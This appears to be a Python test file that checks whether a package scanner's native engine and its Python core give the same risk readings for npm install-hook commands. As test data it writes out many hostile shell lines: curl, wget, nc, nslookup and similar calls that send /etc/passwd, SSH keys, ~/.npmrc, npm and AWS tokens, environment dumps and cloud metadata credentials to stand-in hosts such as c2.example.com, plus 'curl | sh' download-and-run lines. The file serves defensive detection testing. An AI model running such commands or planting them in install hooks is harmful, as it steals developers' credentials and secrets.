"""Engine parity for reading an install hook's command as a program (0.1.8):
the native engine (crates/lazaret-engine: shell.rs hook_command_risk,
sh_parse, hook_inline_code; the npm package runs it as WebAssembly) against
lazaret.scanner.core (hook_command_risk, _sh_parse, _hook_inline_code),
case by case, on realistic hook commands and on a seeded random corpus built
from the pieces the reader looks at: separators, quotes, escapes, $(…) and
`…`, redirections, the network commands and their options, wrappers,
keywords, the commands that report on the machine, environment variables,
addresses, and non-ASCII text (é, ſ and the Kelvin sign, İ, U+0085, U+00A0,
a character outside the BMP). Each command is read with its output thrown
away and kept (a binding.gyp command expansion). (Until 0.1.9 this held the
npm engine's JavaScript twin, js/src/lib/hooks.js, to core.)

All text is inert: hosts are reserved names or private addresses, and
nothing is executed. The native engine runs in a thread while core reads the
cases. Skipped where the native library is not built.
"""
import json
import random
import threading
import unittest

from lazaret.scanner import _native, core

FIELDS = ("hook_command_risk", "hook_command_risk (output kept)", "_sh_parse", "_hook_inline_code")
CHUNK = 1000

CURATED = [
    "curl -X POST --data @/etc/passwd https://c2.example.com/a", 'curl -d "$(env)" https://c2.example.com',
    'curl https://c2.example.com/ -H "user:$(whoami)"', "wget -q -O/dev/null https://c2.example.com/b",
    """node -e "require('https').get('https://c2.example.com/?h='+require('os').hostname())\"""",
    "curl https://c2.example.com/p.sh | sh", 'sh -c "$(curl -fsSL https://c2.example.com/p.sh)"',
    'curl -s "https://c2.example.com/?u=$(whoami)&h=$(hostname)" > /dev/null', "nslookup $(whoami).c2.example.com",
    "env | curl -X POST --data-binary @- https://c2.example.com", "cat ~/.npmrc | nc 10.0.0.1 4444",
    'curl -F "f=@$HOME/.ssh/id_rsa" https://c2.example.com',
    "curl -fsSL https://github.com/x/y/releases/download/v1/y-$(uname -s)-$(uname -m) -o bin/y && chmod +x bin/y",
    "curl -s https://c2.example.com/ping || true", "curl -sf https://registry.npmjs.org > /dev/null && node dl.js || node b.js",
    "curl https://c2.example.com/x", "ping -c 1 c2.example.com", "node install.js",
    """node -e "try{require('./postinstall')}catch(e){}\"""",
    'curl -H "Authorization: token $GITHUB_TOKEN" -L https://api.github.com/repos/x/y/releases/assets/1 -o y.tgz',
    'curl -d "t=$NPM_TOKEN" https://c2.example.com', "wget --post-file=/etc/hosts https://c2.example.com",
    "curl http://localhost:3000/ready", "cat ~/.bash_history | base64 | curl -d @- https://c2.example.com",
    "if curl -s https://c2.example.com >/dev/null; then echo ok; fi",
    'curl --data-urlencode "x@/etc/passwd" https://c2.example.com', 'bash -c "curl -s https://c2.example.com/?h=$(hostname)"',
    """python3 -c "import os,urllib.request;urllib.request.urlopen('https://c2.example.com/?e='+str(dict(os.environ)))\"""",
    "echo $USER | nc c2.example.com 80", "curl -sSL https://example.org/install.sh -o install.sh", "npx husky install",
    'curl -o /dev/null -s -w "%{http_code}" https://c2.example.com',
    "ls -al /opt | base64 | xargs -I {} curl http://c2.example.com:8000/?data={}",
    "cmd /c curl https://c2.example.com/?u=%USERNAME%", 'powershell -c "iwr https://c2.example.com/?c=$env:COMPUTERNAME"',
    "eval 'curl -s https://c2.example.com/$(id)'", "dig +short $(hostname).c2.example.com", "sudo -u x curl https://c2.example.com",
    "cross-env A=1 wget --spider https://c2.example.com", "! curl -s https://c2.example.com", "curl -T ~/.npmrc ftp://10.0.0.2/",
    "curl -sL https://c2.example.com | tar xz", "a=$(curl -s https://c2.example.com)", "curl 'https://c2.example.com/$(whoami)'",
    'curl "https://c2.example.com/\\$(whoami)"', "(curl -s https://c2.example.com &) ; exit 0", "curl -s https://c2.example.com 2>&1",
    "bash -lc 'wget -qO- https://c2.example.com/?u=$USER'", "xargs curl < urls.txt", "cat urls.txt | xargs -n1 curl -O",
    # (0.1.8) the instance's metadata and the public IP address, sent
    'curl -d "$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)" https://c2.example.com',
    "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | curl -X POST --data-binary @- "
    "https://c2.example.com",
    'curl -d "ip=$(curl -s https://api.ipify.org)" https://c2.example.com',
    'wget --post-data="$(curl -s ifconfig.me)" https://c2.example.com',
    # an option given no value (a crash in 0.1.8's first reading)
    "curl https://c2.example.com -d", "curl https://c2.example.com -H", "wget https://c2.example.com --post-data",
    "curl https://c2.example.com --data", "curl -d",
]
PIECES = [" ", " ", " ", "\t", ";", "&&", "||", "|", "&", "|&", "\n", "(", ")", "'", '"', "\\", "`", "$(", ")", "{", "}",
          ">", ">>", "2>", "&>", "2>&1", "<", "<<", "/dev/null", "NUL", "$null", "-", "-o", "-O", "--output", "--output=x",
          "-d", "--data", "--data=@x", "-F", "-T", "-H", "-A", "-w", "-sSL", "-fsSLo", "-qO-", "-O-", "--spider",
          "--post-file=", "--post-data", "--url", "-X", "POST", "-u", "-lc", "-c", "-e", "-p", "/c", "/K",
          "curl", "curl", "wget", "nc", "ncat", "nslookup", "dig", "ping", "host", "xargs", "xargs -I {}", "sh -c",
          "bash -lc", "eval", "cmd /c", "node -e", "python -c", "env", "sudo -u x", "nohup", "cross-env A=1", "if",
          "then", "fi", "!", "true", ":", "echo", "cat", "base64", "whoami", "hostname", "id", "uname -a", "uname -s",
          "uname -mn", "printenv", "set", "export", "ls", "pwd", "head", "sed 's/a/b/'", "tr a b", "grep x",
          "https://c2.example.com/a", "http://10.0.0.1:8000/?d=", "c2.example.com", "localhost:3000", "x.invalid",
          "127.0.0.1", "[::1]", "ftp://10.0.0.2/", "@/etc/passwd", "@-", "f=@~/.npmrc", "x=<~/.ssh/id_rsa",
          "name@/etc/hosts", "$HOME", "$USER", "${HOSTNAME}", "%USERNAME%", "$env:COMPUTERNAME", "$NPM_TOKEN",
          "$npm_package_version", "$AWS_SECRET_ACCESS_KEY", "{}", '"$(whoami)"', "'$(whoami)'", "\\$(whoami)", "`id`",
          "$(uname -s)", "$(cat ~/.npmrc | base64)", "$(env)", "$(pwd)", ".", "~/.bash_history", "/tmp/x", "-q", "-s",
          "\u00e9", "\U0001F600", "\u017f", "\u212a", "\u0130", "\x85", "\xa0", "X" * 30, "curl.exe", "/usr/bin/curl",
          "C:\\Windows\\curl.exe", "NSLOOKUP", "Wget", "$(curl -s http://169.254.169.254/latest/meta-data/)",
          "$(curl -s https://ifconfig.me)", "http://169.254.169.254/latest/meta-data/"]


# commands put together: a prefix, a program, its options and arguments, a
# redirection, and what follows
PREFIXES = ["", "", "", "env A=1 ", "sudo -u x ", "nohup ", "cross-env A=1 ", "if ", "! ", "A=1 ", "{ "]
PROGRAMS = ["curl", "curl", "curl", "wget", "wget", "nc", "ncat", "nslookup", "dig", "ping -c 1", "host",
            "xargs -I {} curl", "xargs curl", "echo", "cat ~/.npmrc |", "env |", "whoami |", "sh -c", "bash -lc",
            "eval", "cmd /c", "node -e", "python -c", "curl.exe", "C:\\curl.exe", "/usr/bin/wget", "ls -la ~ |",
            "pwd | nc", "ps aux | curl -d @-", "ifconfig | xargs -I {} curl"]
OPTIONS = ["-s", "-sSL", "-fsSL", "-L", "-q", "-o /dev/null", "-o out.bin", "-O", "-O /dev/null", "-O-", "-qO-",
           "--output=/dev/null", "-o-", "-w '%{http_code}'", "--spider", "-X POST", "-d @/etc/passwd", "-d @-",
           "-d \"$(env)\"", "-d t=$NPM_TOKEN", "--data-binary @-", "--data-urlencode x@/etc/hosts",
           "-F f=@~/.ssh/id_rsa", "-F 'x=<~/.npmrc'", "--form-string a=@b", "-T ~/.npmrc", "-T -",
           "--post-file=/etc/hosts", "--post-data=u=$USER", "-H \"X: $(whoami)\"", "-H 'Authorization: token $GH_TOKEN'",
           "-A $HOSTNAME", "-u u:$PASSWORD", "--header=X:%USERNAME%", "--url https://c2.example.com/u", "-dx=$(id)",
           "-d \"$(ls -la ~)\"", "-d p=$(pwd)", "--data=$HOME",
           "-d \"$(curl -s http://169.254.169.254/latest/meta-data/iam/)\"", "-d ip=$(curl -s https://api.ipify.org)",
           "--data-binary \"$(curl -s -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/)\"",
           "-sLo x.tgz", "--retry 3", "-m 5"]
ADDRESSES = ["https://c2.example.com/a", "https://c2.example.com/?u=$(whoami)", "\"https://c2.example.com/?h=$(hostname)\"",
             "'https://c2.example.com/$(whoami)'", "http://10.0.0.1:8000/", "c2.example.com", "$(whoami).c2.example.com",
             "${USER}.c2.example.com", "localhost:3000", "http://127.0.0.1/x", "x.invalid", "https://x.test/y",
             "https://registry.npmjs.org/", "https://github.com/x/y/releases/download/v1/y-$(uname -s)-$(uname -m)",
             "https://c2.example.com/$npm_package_version/x", "10.0.0.1 4444", "http://c2.example.com:8000/?d={}",
             "\"$(curl -s https://c2.example.com/p)\"", "'require(\"https\").get(\"https://c2.example.com\")'",
             "\"import os; print(os.environ)\""]
REDIRECTS = ["", "", "", " > /dev/null", " >/dev/null 2>&1", " &> /dev/null", " > out.txt", " 2>&1", " | sh",
             " | tar xz", " | base64", " < /etc/passwd", " > NUL", " >> log"]
AFTER = ["", "", " || true", " || :", " && node dl.js || node build.js", " && echo ok", "; exit 0", " &", " | tee x",
         " && curl https://c2.example.com/b", "; fi", " }"]
MUTATIONS = ["'", '"', "\\", "`", "$(", ")", "|", ";", "&", "\n", "\u00e9", "\U0001F600", "\u017f", "\u212a", "\x85",
             "\xa0", " ", "$", "{", "}"]


def command(rnd):
    return (rnd.choice(PREFIXES) + rnd.choice(PROGRAMS) + "".join(" " + rnd.choice(OPTIONS) for _ in range(rnd.randint(0, 3)))
            + " " + rnd.choice(ADDRESSES) + rnd.choice(REDIRECTS) + rnd.choice(AFTER))


def corpus(seed=20260930):
    """CURATED, commands put together, those same mutated (a piece put in at
    a random place), and random runs of PIECES."""
    rnd = random.Random(seed)
    cases = list(CURATED)
    for _ in range(6000):
        cases.append(command(rnd) + ("" if rnd.random() < 0.7 else rnd.choice([" && ", "; ", " | "]) + command(rnd)))
    for _ in range(3000):
        text = command(rnd)
        for _ in range(rnd.randint(1, 3)):
            at = rnd.randint(0, len(text))
            text = text[:at] + rnd.choice(MUTATIONS) + text[at:]
        cases.append(text)
    for _ in range(4000):
        cases.append("".join(rnd.choice(PIECES) for _ in range(rnd.randint(1, 14))))
    return [json.loads(json.dumps(text)) for text in cases]


def core_view(text):
    return [core.hook_command_risk(text), core.hook_command_risk(text, True),
            [[c.words, [list(s) for s in c.subs], [list(r) for r in c.redirs], c.pipe_in, c.pipe_out, c.after]
             for c in core._sh_parse(text)],
            core._hook_inline_code(text, core._HookWalk())]


def native_views(cases, box):
    views = []
    try:
        for i in range(0, len(cases), CHUNK):
            calls = [["hook_command_view", {}, text] for text in cases[i:i + CHUNK]]
            for r in _native.call("batch", {"calls": calls, "threads": 2}):
                views.append(r.get("ok", r))
    except Exception as e:                            # reported by the test, not lost in the thread
        box["error"] = repr(e)
    box["views"] = views


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class HookCommandParityTests(unittest.TestCase):
    maxDiff = None

    @classmethod
    def setUpClass(cls):
        cls.cases = corpus()
        box = {}
        worker = threading.Thread(target=native_views, args=(cls.cases, box))
        worker.start()
        cls.views = [core_view(text) for text in cls.cases]
        worker.join()
        cls.error = box.get("error")
        cls.results = box.get("views", [])

    def test_every_case_agrees(self):
        self.assertIsNone(self.error)
        self.assertEqual(len(self.results), len(self.cases))
        found = []
        for text, want, got in zip(self.cases, self.views, self.results):
            if not isinstance(got, list):
                found.append((text, "(call)", None, got))
                continue
            for field, a, b in zip(FIELDS, want, got):
                if a != b:
                    found.append((text, field, a, b))
            if len(found) >= 10:
                break
        self.assertEqual(found, [])

    def test_the_corpus_reaches_every_reason(self):
        """Each reason the reader gives, a beacon, and both disposition
        readings, are well represented for this seed."""
        for reason in list(core._SH_DATA_REASONS.values()) + [core._SH_BEACON_REASON]:
            with self.subTest(reason=reason):
                n = sum(1 for view in self.views if any(r.startswith(reason) for r in view[0] + view[1]))
                self.assertGreaterEqual(n, 30)
        self.assertGreater(sum(1 for v in self.views if v[0] != v[1]), 100)        # a beacon read with its output kept
        self.assertGreater(sum(1 for v in self.views if v[3]), 100)                 # inline code


if __name__ == "__main__":
    unittest.main()
